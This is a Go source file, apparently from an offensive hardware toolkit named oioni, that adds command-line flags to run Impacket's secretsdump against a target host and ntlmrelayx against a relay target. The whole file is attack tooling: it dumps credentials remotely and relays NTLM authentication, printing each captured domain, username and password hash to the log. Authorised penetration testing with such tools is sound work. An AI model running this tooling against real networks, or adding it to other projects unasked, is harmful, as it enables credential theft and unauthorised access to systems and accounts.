// cmd/oioni/impacket.go — impacket tool integration (for testing on device)
package main

import (
	"context"
	"flag"
	"log"

	"github.com/oioio-space/oioni/tools/impacket"
)

type impacketFlags struct {
	secretsdump  bool
	ntlmrelay    bool
	target       string
	user         string
	pass         string
	relayTarget  string
}

func defineImpacketFlags() *impacketFlags {
	f := &impacketFlags{}
	flag.BoolVar(&f.secretsdump, "impacket-secretsdump", false, "run secretsdump.py and log credentials")
	flag.BoolVar(&f.ntlmrelay, "impacket-ntlmrelay", false, "run ntlmrelayx.py and log captured hashes")
	flag.StringVar(&f.target, "impacket-target", "", "target host IP (secretsdump)")
	flag.StringVar(&f.user, "impacket-user", "", "username (secretsdump)")
	flag.StringVar(&f.pass, "impacket-pass", "", "password (secretsdump)")
	flag.StringVar(&f.relayTarget, "impacket-relay-target", "", "relay target URL, e.g. smb://192.168.1.1")
	return f
}

// runImpacket executes the requested impacket tool and blocks until done (secretsdump)
// or until ctx is cancelled (ntlmrelay).
func runImpacket(ctx context.Context, f *impacketFlags) {
	imp := impacket.New()

	if f.secretsdump {
		if f.target == "" {
			log.Printf("impacket: -impacket-target required for secretsdump")
			return
		}
		log.Printf("impacket: starting secretsdump → %s", f.target)
		creds, err := imp.SecretsDump(ctx, "secretsdump", impacket.SecretsDumpConfig{
			Target:   f.target,
			Username: f.user,
			Password: f.pass,
		})
		if err != nil {
			log.Printf("impacket: secretsdump error: %v", err)
			return
		}
		log.Printf("impacket: secretsdump found %d credential(s)", len(creds))
		for i, c := range creds {
			log.Printf("  [%d] %s\\%s (%s) hash=%s", i, c.Domain, c.Username, c.Type, c.Hash)
		}
	}

	if f.ntlmrelay {
		if f.relayTarget == "" {
			log.Printf("impacket: -impacket-relay-target required for ntlmrelay")
			return
		}
		log.Printf("impacket: starting ntlmrelayx → %s (SIGTERM to stop)", f.relayTarget)
		relay, err := imp.NTLMRelay(ctx, "ntlmrelay", impacket.NTLMRelayConfig{
			Target:      f.relayTarget,
			SMB2Support: true,
		})
		if err != nil {
			log.Printf("impacket: ntlmrelay start error: %v", err)
			return
		}
		// When ctx is cancelled (SIGTERM), kill the in-container process so Events() closes.
		go func() {
			<-ctx.Done()
			_ = relay.Kill()
		}()
		for e := range relay.Events() {
			log.Printf("impacket: captured %s\\%s hash=%s", e.Domain, e.Username, e.Hash)
		}
		if err := relay.Err(); err != nil {
			log.Printf("impacket: ntlmrelay exited: %v", err)
		} else {
			log.Printf("impacket: ntlmrelay stopped")
		}
	}
}
